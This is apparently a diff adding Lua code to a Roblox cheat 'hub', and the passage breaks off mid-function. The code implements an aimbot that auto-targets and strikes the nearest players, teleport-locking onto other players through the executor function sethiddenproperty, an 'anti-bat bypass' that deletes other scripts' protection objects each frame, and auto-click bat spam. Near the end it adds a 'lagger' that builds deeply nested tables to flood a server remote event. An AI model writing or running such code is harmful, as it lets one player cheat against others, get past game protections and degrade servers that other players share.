+            if __HH.bodyLockEnabled and __HH.startBodyLock then task.delay(0.2, __HH.startBodyLock) end
+        end
+        if batAimMode == "bypass" then
+            if enabled then
+                disableNewAim()
+                if _G.HHGoodAimSet then _G.HHGoodAimSet(true) end
+            else
+                if _G.HHGoodAimSet then _G.HHGoodAimSet(false) end
+            end
+        else
+            if enabled then
+                if _G.HHGoodAimSet then _G.HHGoodAimSet(false) end
+                enableNewAim()
+            else
+                disableNewAim()
+            end
+        end
+    end
+
+    -- MIRROR TP DOWN (ported from FR HUB and adapted to Pure's AIM BOT).
+    -- It watches Pure's current sticky target and mirrors any sudden 3-stud
+    -- downward move by placing the local root at Pure's TP DOWN level.
+    do
+        local MIRROR_TP_DROP_THRESHOLD = 3
+        local MIRROR_TP_DOWN_Y = -7.00
+        local mirrorEnabled = false
+        local mirrorTrackedRoot = nil
+        local mirrorPreviousY = nil
+        local mirrorLastTeleport = 0
+        local mirrorHeartbeat = nil
+        local mirrorCharacterConn = nil
+
+        local function clearMirrorTracking()
+            mirrorTrackedRoot = nil
+            mirrorPreviousY = nil
+        end
+
+        local function getPureAimTarget()
+            if not newAimEnabled then return nil end
+            local target = _aimbotTarget
+            if not target or not target.Parent then return nil end
+            local targetHumanoid = target.Parent:FindFirstChildOfClass("Humanoid")
+            if not targetHumanoid or targetHumanoid.Health <= 0 then return nil end
+            return target
+        end
+
+        local function mirrorTeleportDown()
+            local character = LP.Character
+            local root = character and character:FindFirstChild("HumanoidRootPart")
+            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+            if not root or not humanoid or humanoid.Health <= 0 then return end
+
+            local now = tick()
+            if now - mirrorLastTeleport < 0.08 then return end
+            mirrorLastTeleport = now
+
+            local _, yaw = root.CFrame:ToEulerAnglesYXZ()
+            root.CFrame = CFrame.new(root.Position.X, MIRROR_TP_DOWN_Y, root.Position.Z)
+                * CFrame.Angles(0, yaw, 0)
+
+            -- Use Pure's own AIM BOT LinearVelocity cleanup, matching FR's
+            -- shared-velocity behavior without writing HRP.Velocity directly.
+            _setV(root, Vector3.zero)
+            root.AssemblyAngularVelocity = Vector3.zero
+        end
+
+        local function setMirrorEnabled(on)
+            mirrorEnabled = on == true
+            if not mirrorEnabled then clearMirrorTracking() end
+            if _G.PureMirrorTPDownSetVisual then
+                pcall(_G.PureMirrorTPDownSetVisual, mirrorEnabled)
+            end
+            return mirrorEnabled
+        end
+
+        pcall(function()
+            if _G.PureMirrorTPDown and _G.PureMirrorTPDown.Destroy then
+                _G.PureMirrorTPDown.Destroy()
+            end
+        end)
+
+        mirrorHeartbeat = RunService.Heartbeat:Connect(function()
+            if not mirrorEnabled then
+                clearMirrorTracking()
+                return
+            end
+
+            local target = getPureAimTarget()
+            if not target then
+                clearMirrorTracking()
+                return
+            end
+
+            local currentY = target.Position.Y
+            if target ~= mirrorTrackedRoot then
+                mirrorTrackedRoot = target
+                mirrorPreviousY = currentY
+                return
+            end
+
+            local previousY = mirrorPreviousY
+            mirrorPreviousY = currentY
+            if previousY and previousY - currentY >= MIRROR_TP_DROP_THRESHOLD then
+                mirrorTeleportDown()
+                mirrorPreviousY = target.Parent and target.Position.Y or nil
+            end
+        end)
+
+        mirrorCharacterConn = LP.CharacterAdded:Connect(clearMirrorTracking)
+
+        _G.PureMirrorTPDown = {
+            enabled = function() return mirrorEnabled end,
+            setEnabled = setMirrorEnabled,
+            getTarget = getPureAimTarget,
+            Destroy = function()
+                mirrorEnabled = false
+                clearMirrorTracking()
+                if mirrorHeartbeat then mirrorHeartbeat:Disconnect(); mirrorHeartbeat = nil end
+                if mirrorCharacterConn then mirrorCharacterConn:Disconnect(); mirrorCharacterConn = nil end
+            end,
+        }
+    end
+
+    RunService.RenderStepped:Connect(function()
+        if not newAimEnabled then return end
+        local char = LP.Character; if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
+        local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
+
+        if not newBatEquippedThisRun then
+            newBatEquippedThisRun = true
+            if not char:FindFirstChildOfClass("Tool") then
+                local bat = findBat()
+                if bat then pcall(function() hum:EquipTool(bat) end) end
+            end
+        end
+
+        local target, targetPlr = getStickyTarget(_aimbotTarget)
+        if not target then
+            _aimbotTarget = nil
+            _lastTargetY = 0
+            swingCurrentBat(char)
+            return
+        end
+        _aimbotTarget = target
+        _aimbotTargetPlr = targetPlr
+
+        local mode
+        mode, _jumpHistory, _infiniteJumpDetected, _tpDownDetected, _peakY, _normalModeTimer, _lastTargetY =
+            detectInfiniteJumpGeneric(target, _jumpHistory, _infiniteJumpDetected, _tpDownDetected, _peakY, _normalModeTimer, _lastTargetY)
+
+        local predictPos = computePredictedPos(root, target, mode)
+
+        local direction = predictPos - root.Position
+        local flatDir = Vector3.new(direction.X, 0, direction.Z)
+        if flatDir.Magnitude > 0.01 then flatDir = flatDir.Unit else flatDir = Vector3.new(0, 0, 0) end
+
+        local desiredHeight = predictPos.Y
+        if mode == "normal" then
+            local jumpOffset = math.max(0, _getV(target).Y * 0.18)
+            desiredHeight = predictPos.Y + 3.7 + jumpOffset
+        end
+
+        local yVel = (desiredHeight - root.Position.Y) * 22 + _getV(target).Y * 1.1
+        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
+        yVel = math.clamp(yVel, -70, 135)
+
+        local spd = getAimSpeed()
+        local desiredVel = Vector3.new(flatDir.X * spd, yVel, flatDir.Z * spd)
+        _setV(root, _getV(root):Lerp(desiredVel, 0.85))
+
+        local rotPredictTime = math.clamp(_getV(target).Magnitude / 120, 0.05, 0.25)
+        local rotPredictedPos = target.Position + _getV(target) * rotPredictTime
+        local toPredict = rotPredictedPos - root.Position
+        if toPredict.Magnitude > 0.1 then
+            local goalCF = CFrame.lookAt(root.Position, rotPredictedPos)
+            local diffCF = root.CFrame:Inverse() * goalCF
+            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
+            rx = math.clamp(rx, -2.5, 2.5); ry = math.clamp(ry, -2.5, 2.5); rz = math.clamp(rz, -2.5, 2.5)
+            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 50, ry * 50, rz * 50))
+        end
+
+        swingCurrentBat(char)
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if not newAimEnabled then return end
+        local char = LP.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        local v = _getV(root)
+        if math.abs(v.X) > 350 or math.abs(v.Z) > 350 then
+            _setV(root, Vector3.new(0, v.Y, 0))
+        end
+    end)
+
+    LP.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        newBatEquippedThisRun = false
+        _jumpHistory = {}; _infiniteJumpDetected = false; _tpDownDetected = false
+        _peakY = 0; _normalModeTimer = 0; _lastTargetY = 0
+        _aimbotTarget = nil
+        if newAimEnabled then
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if hum then hum.AutoRotate = false end
+        end
+    end)
+
+    -- Raw AIM BOT backend. Anti Kick only performs temporary Timer suppression.
+    _G.PureCursedSetAimbot = setAutoBatState
+    _G.PureCursedGetAimbot = function()
+        if batAimMode == "bypass" then
+            return (_G.HHGoodAimGet and _G.HHGoodAimGet()) or false
+        end
+        return newAimEnabled
+    end
+    _G.PureCursedClearAimVelocity = function()
+        local character = LP.Character
+        local root = character and character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        if batAimMode == "bypass" then
+            root.Velocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+        else
+            _destroyLV(root)
+        end
+    end
+    function toggleBatV2()
+        local turningOn = not __HH.batV2Enabled
+        _G.PureDropThenAimSafeModeAuthorized = false
+        __HH.batV2Enabled = turningOn
+        setAutoBatState(__HH.batV2Enabled)
+        if __HH.batV2SetVisual then __HH.batV2SetVisual(__HH.batV2Enabled) end
+        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(__HH.batV2Enabled) end
+        return __HH.batV2Enabled
+    end
+    function stopAimbotFull()
+        __HH.batV2Enabled = false
+        setAutoBatState(false)
+        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
+        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
+    end
+    function queueAutoBatStart()
+        if not __HH.batV2Enabled then __HH.batV2Enabled = true end
+        setAutoBatState(true)
+    end
+    function stopBatAimbot()
+        setAutoBatState(false)
+    end
+    -- TP BAT (ported from M10RU TP BAT — exact behavior)
+    local tpBatActive = false
+    local tpBatHeartbeat = nil
+    local tpBatHittingCooldown = false
+
+    local function getBatTP()
+        local char = LP.Character
+        if not char then return nil end
+        local tool = char:FindFirstChild("Bat")
+        if tool then return tool end
+        local bp = LP:FindFirstChild("Backpack")
+        if bp then
+            tool = bp:FindFirstChild("Bat")
+            if tool then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum then pcall(function() hum:EquipTool(tool) end) end
+                return tool
+            end
+        end
+        return nil
+    end
+
+    local function tryHitBatTP()
+        if tpBatHittingCooldown then return end
+        tpBatHittingCooldown = true
+        pcall(function()
+            local bat = getBatTP()
+            if bat then
+                bat:Activate()
+                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
+                if ev then ev:FireServer() end
+            end
+        end)
+        task.delay(0.08, function()
+            tpBatHittingCooldown = false
+        end)
+    end
+
+    local function getClosestPlayerTP()
+        local char = LP.Character
+        if not char then return nil, math.huge end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return nil, math.huge end
+        local closest, minDist = nil, math.huge
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then
+                local tr = p.Character:FindFirstChild("HumanoidRootPart")
+                if tr then
+                    local d = (hrp.Position - tr.Position).Magnitude
+                    if d < minDist then
+                        minDist = d
+                        closest = p
+                    end
+                end
+            end
+        end
+        return closest, minDist
+    end
+
+    local function tpBatTick()
+        if not tpBatActive then return end
+        local char = LP.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        local target = getClosestPlayerTP()
+        if target and target.Character then
+            local tr = target.Character:FindFirstChild("HumanoidRootPart")
+            if tr then
+                if sethiddenproperty then
+                    pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", tr) end)
+                end
+                local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
+                if (hrp.Position - targetPos).Magnitude > 8 then
+                    hrp.CFrame = CFrame.new(targetPos)
+                end
+                local cam = workspace.CurrentCamera
+                if cam then
+                    cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position)
+                end
+                tryHitBatTP()
+            end
+        end
+    end
+
+    function startTPLock()
+        if tpBatActive then return end
+
+        -- Horizon integration: turn off AIM BOT / Auto Left / Auto Right first (unrelated to M10RU logic below)
+        if __HH.batV2Enabled and toggleBatV2 then pcall(toggleBatV2) end
+        if autoLeftEnabled and stopAutoLeft then
+            autoLeftEnabled = false
+            pcall(stopAutoLeft)
+        end
+        if autoRightEnabled and stopAutoRight then
+            autoRightEnabled = false
+            pcall(stopAutoRight)
+        end
+
+        if _G.HorizonStealModes then _G.HorizonStealModes.Suspend() end
+        if __HH.stopBodyLock then __HH.stopBodyLock() end
+        tpBatActive = true
+        __HH.tpLockEnabled = true
+        __HH.antiVoidTPBat = true
+        __HH._tpBatOldAntiDie = __HH.antiDieEnabled
+        __HH.antiDieEnabled = true
+        if __HH.startAntiDie then __HH.startAntiDie() end
+        if tpBatHeartbeat then tpBatHeartbeat:Disconnect() end
+        tpBatHeartbeat = RunService.Heartbeat:Connect(tpBatTick)
+
+        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(true) end
+        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(true) end
+        return true
+    end
+
+    function stopTPLock()
+        if not tpBatActive then return end
+        tpBatActive = false
+        __HH.tpLockEnabled = false
+        __HH.antiVoidTPBat = false
+        if __HH._tpBatOldAntiDie ~= nil then
+            __HH.antiDieEnabled = __HH._tpBatOldAntiDie
+            if __HH.antiDieEnabled and __HH.startAntiDie then __HH.startAntiDie() elseif __HH.stopAntiDie then __HH.stopAntiDie() end
+            __HH._tpBatOldAntiDie = nil
+        end
+        if _G.HorizonStealModes then _G.HorizonStealModes.Resume() end
+        if __HH.bodyLockEnabled and __HH.startBodyLock then task.delay(0.2,__HH.startBodyLock) end
+
+        if tpBatHeartbeat then
+            tpBatHeartbeat:Disconnect()
+            tpBatHeartbeat = nil
+        end
+        do
+            local char = LP.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp and sethiddenproperty then
+                pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", nil) end)
+            end
+        end
+
+        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(false) end
+        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(false) end
+    end
+
+    function toggleTPLock()
+        if tpBatActive then
+            stopTPLock()
+        else
+            startTPLock()
+        end
+        return __HH.tpLockEnabled
+    end
+
+    _G.PureTPBatV4Start = startTPLock
+    _G.PureTPBatV4Stop = stopTPLock
+    _G.PureTPBatV4Toggle = toggleTPLock
+
+end
+
+
+do
+-- ============ FR "GOOD AIMBOT" (BYPASSES ALL ANTI BAT) ============
+-- Ported from FR's merged aimbots: destroys every anti-bat lock
+-- (LockBAV / LockAngVel / BatLock / ...) each heartbeat, drives rotation
+-- through its own AngularVelocity (_GB_AngV) and moves with raw Velocity.
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+
+    local GOOD_CFG = { SPEED = 58, VERT_SPEED = 58, LOOK_OFFSET = 5, antiLaggerMode = false, SPEED_LIMIT = 60 }
+    local GOOD_TURN_SPEED = 40
+    local GOOD_MAX_TURN   = 28
+
+    local goodEnabled         = false
+    local goodEquippedThisRun = false
+    local goodAngVelc         = nil
+    local goodAngVelcAtt      = nil
+    local _goodIntendedVel    = Vector3.zero
+    local _goodTarget         = nil
+
+    local _tpDownLastY     = 0
+    local _tpDownTracked    = nil
+    local _tpDownCooldown   = false
+
+    local DETECT_NAMES = {"LockBAV","LockAngVel","LockBodyAtt","BatLock","LockBAVAtt","AutoBatAtt","AutoBatAV","AntiBatDet","AntiAim","VelocityLock"}
+
+    local function purgeHRP(hrp)
+        if not hrp then return end
+        pcall(function()
+            for _, n in ipairs(DETECT_NAMES) do
+                local o = hrp:FindFirstChild(n)
+                if o then o:Destroy() end
+            end
+            for _, c in ipairs(hrp:GetChildren()) do
+                local low = c.Name:lower()
+                if c.Name ~= "_GB_AngV" and c.Name ~= "_GB_Att"
+                and (low:find("lockb") or low:find("lockangv") or low:find("batlock") or low:find("antiaim") or low:find("velocitylock")) then
+                    pcall(function() c:Destroy() end)
+                end
+            end
+        end)
+    end
+
+    local function setupGoodAngVelc(hrp)
+        pcall(function()
+            local o1 = hrp:FindFirstChild("_GB_AngV")
+            local o2 = hrp:FindFirstChild("_GB_Att")
+            if o1 then o1:Destroy() end
+            if o2 then o2:Destroy() end
+        end)
+        local att = Instance.new("Attachment"); att.Name = "_GB_Att"; att.Parent = hrp
+        local av = Instance.new("AngularVelocity")
+        av.Name = "_GB_AngV"; av.Attachment0 = att
+        av.RelativeTo = Enum.ActuatorRelativeTo.World
+        av.MaxTorque = math.huge; av.AngularVelocity = Vector3.zero; av.Parent = hrp
+        goodAngVelcAtt = att; goodAngVelc = av
+    end
+
+    local function cleanGoodAngVelc()
+        pcall(function() if goodAngVelc    and goodAngVelc.Parent    then goodAngVelc:Destroy()    end end)
+        pcall(function() if goodAngVelcAtt and goodAngVelcAtt.Parent then goodAngVelcAtt:Destroy() end end)
+        goodAngVelc = nil; goodAngVelcAtt = nil
+    end
+
+    local function goodEnable()
+        goodEquippedThisRun = false; goodEnabled = true; _goodIntendedVel = Vector3.zero
+        local char = LP.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then purgeHRP(hrp); setupGoodAngVelc(hrp) end
+    end
+
+    local function goodDisable()
+        goodEnabled = false; goodEquippedThisRun = false
+        local char = LP.Character
+        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+        local hum  = char and char:FindFirstChildOfClass("Humanoid")
+        if hrp then hrp.Velocity = hrp.Velocity * 0.3; purgeHRP(hrp) end
+        if hum then hum.AutoRotate = true end
+        if goodAngVelc then pcall(function() goodAngVelc.AngularVelocity = Vector3.zero end) end
+        cleanGoodAngVelc()
+    end
+
+    local function detectTPDown()
+        local target = _goodTarget
+        if not target or not target.Parent then
+            _tpDownLastY = 0; _tpDownTracked = nil
+            return false
+        end
+        if _tpDownTracked ~= target then
+            _tpDownTracked = target; _tpDownLastY = target.Position.Y
+            return false
+        end
+        local y = target.Position.Y
+        local drop = _tpDownLastY - y
+        _tpDownLastY = y
+        local velY = target.Velocity.Y
+        return (drop > 20) or (drop > 8 and velY < -80)
+    end
+
+    local function executeTPDownCounter()
+        if _tpDownCooldown then return end
+        local char = LP.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+        local filterList = {}
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character then table.insert(filterList, plr.Character) end
+        end
+        local rayParams = RaycastParams.new()
+        rayParams.FilterDescendantsInstances = filterList
+        rayParams.FilterType = Enum.RaycastFilterType.Exclude
+        rayParams.IgnoreWater = false
+        local rayResult = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0), rayParams)
+        if rayResult then
+            _tpDownCooldown = true
+            hrp.Velocity = Vector3.zero
+            hrp.AssemblyAngularVelocity = Vector3.zero
+            hrp.CFrame = CFrame.new(rayResult.Position + Vector3.new(0, 3, 0))
+            task.delay(0.05, function() _tpDownCooldown = false end)
+        end
+    end
+
+    RunService.Heartbeat:Connect(function()
+        if not goodEnabled then return end
+        local char = LP.Character
+        local hum  = char and char:FindFirstChildOfClass("Humanoid")
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not root or not hum then return end
+        purgeHRP(root)
+        pcall(function()
+            if _G and _G.FR_State then
+                _G.FR_State.antiBatEnabled = false; _G.FR_State.bypassAntiBatEnabled = false
+            end
+        end)
+        if detectTPDown() then executeTPDownCounter() end
+        if not goodAngVelc or not goodAngVelc.Parent then setupGoodAngVelc(root) end
+        if not goodEquippedThisRun then
+            goodEquippedThisRun = true
+            if not char:FindFirstChildOfClass("Tool") then
+                local bp  = LP:FindFirstChild("Backpack")
+                local bat = bp and bp:FindFirstChild("Bat")
+                if bat then pcall(function() hum:EquipTool(bat) end) end
+            end
+        end
+        local closestTR, closestDist = nil, math.huge
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LP and plr.Character then
+                local tr = plr.Character:FindFirstChild("HumanoidRootPart")
+                local h2 = plr.Character:FindFirstChildOfClass("Humanoid")
+                if tr and h2 and h2.Health > 0 then
+                    local d = (tr.Position - root.Position).Magnitude
+                    if d < closestDist then closestDist = d; closestTR = tr end
+                end
+            end
+        end
+        if closestTR then
+            if _goodTarget ~= closestTR then _goodTarget = closestTR end
+            local _vs     = closestTR.Velocity.Magnitude
+            local _dynOff = _vs < 0.1 and 1.5 or GOOD_CFG.LOOK_OFFSET
+            local fp      = closestTR.Position + closestTR.CFrame.LookVector * _dynOff
+            local look    = fp - root.Position
+            local flatLook = Vector3.new(look.X, 0, look.Z)
+            hum.AutoRotate = false
+            if look.Magnitude > 0.01 and flatLook.Magnitude > 0.01 then
+                local tYaw  = math.deg(math.atan2(-flatLook.X, -flatLook.Z))
+                local yawD  = (tYaw - root.Orientation.Y + 180) % 360 - 180
+                local tPit  = math.deg(math.atan2(look.Y, flatLook.Magnitude))
+                local pitD  = (tPit - root.Orientation.X + 180) % 360 - 180
+                local yawR  = math.clamp(math.rad(yawD) * GOOD_TURN_SPEED, -GOOD_MAX_TURN, GOOD_MAX_TURN)
+                local pitR  = math.clamp(math.rad(pitD) * GOOD_TURN_SPEED, -GOOD_MAX_TURN, GOOD_MAX_TURN)
+                local yRad  = math.rad(root.Orientation.Y)
+                local rAxis = Vector3.new(math.cos(yRad), 0, -math.sin(yRad))
+                goodAngVelc.AngularVelocity = Vector3.new(0, yawR, 0) + (rAxis * pitR)
+            else
+                goodAngVelc.AngularVelocity = Vector3.zero
+            end
+            local mDir = fp - root.Position
+            local hDir = Vector3.new(mDir.X, 0, mDir.Z)
+
+            local effectiveSpeed = GOOD_CFG.SPEED
+            if GOOD_CFG.antiLaggerMode then
+                local targetHorizSpeed = Vector3.new(closestTR.Velocity.X, 0, closestTR.Velocity.Z).Magnitude
+                if targetHorizSpeed < 30 then
+                    effectiveSpeed = 30
+                else
+                    effectiveSpeed = math.min(GOOD_CFG.SPEED_LIMIT, targetHorizSpeed)
+                end
+            end
+
+            local hVel = hDir.Magnitude > 0.1 and hDir.Unit * effectiveSpeed or Vector3.zero
+            local vVel = math.abs(mDir.Y) > 0.8
+                and Vector3.new(0, math.sign(mDir.Y) * GOOD_CFG.VERT_SPEED, 0)
+                or  Vector3.new(0, -2, 0)
+            _goodIntendedVel = hVel + vVel; root.Velocity = _goodIntendedVel
+            if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end
+            if closestDist <= 5 then
+                local bat = char:FindFirstChild("Bat")
+                if bat and bat:IsA("Tool") then
+                    pcall(function()
+                        bat:Activate()
+                        local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
+                        if ev then ev:FireServer() end
+                    end)
+                end
+            end
+        else
+            _goodTarget = nil
+            hum.AutoRotate = true
+            if goodAngVelc then pcall(function() goodAngVelc.AngularVelocity = Vector3.zero end) end
+        end
+    end)
+
+    RunService.RenderStepped:Connect(function()
+        if not goodEnabled then return end
+        local char = LP.Character
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        local v = root.Velocity
+        if math.abs(v.X) > 350 or math.abs(v.Z) > 350 then root.Velocity = _goodIntendedVel end
+        purgeHRP(root)
+    end)
+
+    LP.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        goodEquippedThisRun = false
+        _tpDownLastY = 0; _tpDownTracked = nil
+        _goodTarget = nil
+        if goodEnabled then
+            local hrp = char:WaitForChild("HumanoidRootPart", 5)
+            if hrp then purgeHRP(hrp); setupGoodAngVelc(hrp) end
+        end
+    end)
+
+    _G.HHGoodAimSet   = function(on) if on then goodEnable() else goodDisable() end end
+    _G.HHGoodAimGet   = function() return goodEnabled end
+    _G.HHGoodAimPurge = purgeHRP
+    _G.HHGoodAimCfg   = GOOD_CFG
+end
+
+-- BAT SPAM (ported from FR HUB).
+-- Uses FR's activation loop, close-range double swing and watchdog behavior.
+do
+    local S = {enabled=false, thread=nil, delay=50, watchdog=nil}
+
+    local function getEquippedBat()
+        local character = LP.Character
+        if not character then return nil end
+        local bat = character:FindFirstChild("bat") or character:FindFirstChild("Bat")
+        if bat and bat:IsA("Tool") and bat.Parent == character then return bat end
+        for _, tool in ipairs(character:GetChildren()) do
+            if tool:IsA("Tool") then
+                local name = tool.Name:lower()
+                if name:find("bat") or name:find("slap") then return tool end
+            end
+        end
+        return nil
+    end
+
+    local function getNearestDistance(root)
+        local nearest = math.huge
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LP and player.Character then
+                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
+                local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
+                    local distance = (targetRoot.Position - root.Position).Magnitude
+                    if distance < nearest then nearest = distance end
+                end
+            end
+        end
+        return nearest
+    end
+
+    local function runSpamLoop()
+        if S.thread then return end
+        S.thread = task.spawn(function()
+            while S.enabled do
+                pcall(function()
+                    local character = LP.Character
+                    local bat = getEquippedBat()
+                    if character and bat then
+                        bat:Activate()
+                        local root = character:FindFirstChild("HumanoidRootPart")
+                        if root and getNearestDistance(root) < 6 then
+                            task.wait(0.02)
+                            if bat.Parent == character then bat:Activate() end
+                        end
+                    end
+                end)
+                task.wait(S.delay / 1000)
+            end
+            S.thread = nil
+        end)
+    end
+
+    local function startBatSpam()
+        S.enabled = true
+        runSpamLoop()
+        if not S.watchdog then
+            S.watchdog = task.spawn(function()
+                while S.enabled do
+                    task.wait(0.6)
+                    if S.enabled and not S.thread then runSpamLoop() end
+                end
+                S.watchdog = nil
+            end)
+        end
+    end
+
+    local function stopBatSpam()
+        S.enabled = false
+        if S.thread then pcall(task.cancel, S.thread); S.thread = nil end
+        if S.watchdog then pcall(task.cancel, S.watchdog); S.watchdog = nil end
+    end
+
+    local function setBatSpamEnabled(on)
+        if on == true then startBatSpam() else stopBatSpam() end
+        if _G.PureBatSpamSetVisual then pcall(_G.PureBatSpamSetVisual, S.enabled) end
+        return S.enabled
+    end
+
+    pcall(function()
+        if _G.PureBatSpam and _G.PureBatSpam.Destroy then _G.PureBatSpam.Destroy() end
+    end)
+
+    _G.PureBatSpam = {
+        enabled = function() return S.enabled end,
+        setEnabled = setBatSpamEnabled,
+        Destroy = function() stopBatSpam() end,
+    }
+end
+
+__HH.guiTransparencyEnabled = false
+__HH.selectedDevice = nil -- "PC" | "MOBILE" | "CONTROLLER" (set by the device picker / Reset Device)
+__HH.mobileButtonsEnabled = true
+__HH.mobileButtonsSize = 80
+__HH.circleButtonsEnabled = false
+__HH.shapeButtonsEnabled = false
+__HH.rectangularButtonsEnabled = false
+__HH.mobBtnRefs = {}
+local apExtSetLeft  = nil   -- visual updater for external LEFT btn
+local apExtSetRight = nil   -- visual updater for external RIGHT btn
+-- Mobile tab: per-button visibility (true = show, false = hidden)
+__HH.buttonVisibility = {
+    drop=true, tpDown=true, batV1=true, batV2=true, tpLock=true,
+    lagger=true, laggerCarry=true, carrySpeed=true,
+    instaReset=true,
+}
+-- Auto drop + aimbot when TP BAT / BAT V2 enabled while carrying (always on)
+local function refreshAPExtBtns()
+    local COL_ON  = Color3.fromRGB(0, 130, 255)
+    local COL_OFF = Color3.fromRGB(20, 28, 65)
+    if apExtSetLeft  then apExtSetLeft (autoLeftEnabled and COL_ON or COL_OFF) end
+    if apExtSetRight then apExtSetRight(autoRightEnabled and COL_ON or COL_OFF) end
+end
+__HH.mobGuiRef = nil
+__HH.infJumpMode = "manual"
+__HH.holdInfJumpConn = nil
+__HH.uiLocked = false
+__HH.perButtonDragEnabled = true
+
+__HH.BTN_OFF = Color3.fromRGB(85, 190, 255)
+__HH.BTN_ON = Color3.fromRGB(255, 105, 115)
+__HH.TEXT_OFF = Color3.fromRGB(205, 232, 255)
+__HH.TEXT_ON = Color3.fromRGB(205, 232, 255)
+
+__HH.KB = {
+    DropBrainrot  = {kb = Enum.KeyCode.X,           gp = nil},
+    
+    TPLock        = {kb = Enum.KeyCode.E,           gp = nil},
+    TPFloor       = {kb = Enum.KeyCode.F,           gp = nil},
+    GuiHide       = {kb = Enum.KeyCode.LeftControl, gp = nil},
+    SpeedToggle   = {kb = Enum.KeyCode.Q,           gp = nil},
+    -- Frame Reset uses its original R key. Lagger moves to the old reset key
+    -- so the two actions never fire from the same keyboard input.
+    LaggerToggle  = {kb = Enum.KeyCode.G,           gp = nil},
+    InstaReset    = {kb = Enum.KeyCode.R,           gp = nil},
+    AutoLeft      = {kb = Enum.KeyCode.Z,           gp = nil},
+    AutoRight     = {kb = Enum.KeyCode.C,           gp = nil},
+    BatV2Toggle   = {kb = Enum.KeyCode.V,           gp = nil}
+}
+
+__HH.isGamepadInput = function(inp)
+    if not inp then return false end
+    if inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") then return true end
+    return false
+end
+
+__HH.isBindableInput = function(inp)
+    if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
+    if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
+    return __HH.isGamepadInput(inp)
+end
+
+end
+do
+local CONTROLLER_BUTTONS = {
+    [Enum.KeyCode.ButtonA]      = "A",       [Enum.KeyCode.ButtonB]      = "B",
+    [Enum.KeyCode.ButtonX]      = "X",       [Enum.KeyCode.ButtonY]      = "Y",
+    [Enum.KeyCode.ButtonL1]     = "LB",      [Enum.KeyCode.ButtonR1]     = "RB",
+    [Enum.KeyCode.ButtonL2]     = "LT",      [Enum.KeyCode.ButtonR2]     = "RT",
+    [Enum.KeyCode.ButtonL3]     = "LS",      [Enum.KeyCode.ButtonR3]     = "RS",
+    [Enum.KeyCode.ButtonStart]  = "START",   [Enum.KeyCode.ButtonSelect] = "SELECT",
+    [Enum.KeyCode.DPadUp]       = "DPAD_UP", [Enum.KeyCode.DPadLeft]     = "DPAD_LEFT",
+    [Enum.KeyCode.DPadRight]    = "DPAD_RIGHT"
+}
+
+__HH.getKeyDisplayName = function(key, isGp)
+    if isGp and CONTROLLER_BUTTONS[key] then return CONTROLLER_BUTTONS[key] end
+    return key and key.Name or "None"
+end
+
+__HH.kbMatch = function(entry, kc)
+    return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
+end
+
+local laggerState = {enabled = false, thread = nil, waitTime = 0.25, intensity = 270}
+local isTouchEnabled = __HH.UIS.TouchEnabled
+if isTouchEnabled then laggerState.waitTime = 5.8 end
+local _laggerActive = false
+
+local function createNestedTable(amount)
+    local nested = {{}}; local current = nested[1]
+    for i = 1, amount do local t = {}; table.insert(current, t); current = t end
+    return nested
+end
+
+local function sendLagSpam()
+    local nested = createNestedTable(laggerState.intensity)
+    local payload = {}
+    local maxCopies = math.min(499999 / (laggerState.intensity + 2), 1500)
+    for i = 1, maxCopies do table.insert(payload, nested) end
+    pcall(function()
+        local r = game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
